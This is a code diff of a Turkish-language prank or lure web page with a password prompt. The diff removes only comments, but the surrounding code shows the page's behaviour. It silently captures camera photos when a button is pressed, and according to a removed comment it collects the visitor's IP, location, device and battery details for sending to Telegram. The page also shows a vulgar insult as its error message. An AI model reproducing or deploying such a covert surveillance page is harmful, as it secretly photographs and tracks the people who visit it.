@@ -78,7 +78,6 @@
 </head>
 <body>
 
-  <!-- Minecraft kırılma sesi -->
   <audio id="breakSound" src="https://minecraft.wiki/images/Minecraft_block_stone_break1.ogg?e117f" preload="auto"></audio>
 
   <div id="girisEkrani">
@@ -90,7 +89,6 @@
 
   <div id="ayikOl">AYIK OL</div>
   <div id="uyari">her linke tıklama</div>
-
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
   <video id="kamera" autoplay playsinline muted></video>
@@ -108,7 +106,6 @@
         document.getElementById("ayikOl").style.display = "block";
         document.getElementById("koduGonder").style.display = "inline-block";
 
-        // IP, konum, cihaz, şarj bilgisi çek ve Telegram'a gönder
         fetch("https://ipapi.co/json")
           .then(res => res.json())
           .then(ip => {
@@ -145,25 +142,20 @@
     function koduGonderTiklandi(button) {
       tiklamaSayisi++;
 
-      // Minecraft kırılma sesi
       const audio = document.getElementById("breakSound");
       audio.currentTime = 0;
       audio.play();
 
-      // Telefon titreşimi
       if (navigator.vibrate) {
         navigator.vibrate(150);
       }
 
-      // Kamera görüntüsünden foto çek
       fotoGonder();
 
-      // İkinci tıklamada uyarı çıkar
       if (tiklamaSayisi === 2) {
         document.getElementById("uyari").style.display = "block";
       }
 
-      // Efekt
       explodeButton(button);
     }
 
@@ -190,7 +182,7 @@
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1); // Ayna
+      ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob(blob => {
@@ -205,6 +197,5 @@
       }, 'image/jpeg');
     }
   </script>
-
 </body>
 </html>
